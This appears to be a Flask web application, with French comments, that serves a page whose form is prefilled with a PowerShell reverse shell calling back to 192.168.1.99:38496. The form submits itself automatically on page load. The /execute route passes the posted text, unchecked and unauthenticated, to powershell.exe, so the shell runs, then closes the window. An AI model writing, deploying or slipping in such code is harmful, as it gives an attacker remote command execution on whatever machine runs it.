from flask import Flask, request

app = Flask(__name__)

# Page HTML avec un formulaire pour entrer le code PowerShell
html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Execute PowerShell</title>
</head>
<body onload="document.forms['powershell_form'].submit();">
    <h1>Execute PowerShell Code</h1>
    <form method="post" action="/execute" name="powershell_form">
        <textarea name="powershell_code" id="powershell_code" rows="4" cols="50" placeholder="Entrez votre code PowerShell ici...">Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser 
$LHOST = "192.168.1.99"; $LPORT = 38496; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()</textarea>
        <br>
        <input type="submit" value="Exécuter PowerShell">
    </form>
    <div id="result">{{ result }}</div>
</body>
</html>
"""

@app.route('/')
def index():
    return html_template

@app.route('/execute', methods=['POST'])
def execute_powershell():
    if request.method == 'POST':
        powershell_code = request.form['powershell_code']
        try:
            import subprocess
            result = subprocess.check_output(['powershell.exe', '-Command', powershell_code], text=True)
            return html_template.replace('{{ result }}', result) + "<script>window.close();</script>"
        except subprocess.CalledProcessError as e:
            return html_template.replace('{{ result }}', str(e)) + "<script>window.close();</script>"

if __name__ == '__main__':
    app.run(host='192.168.1.55', port=8080, debug=True)
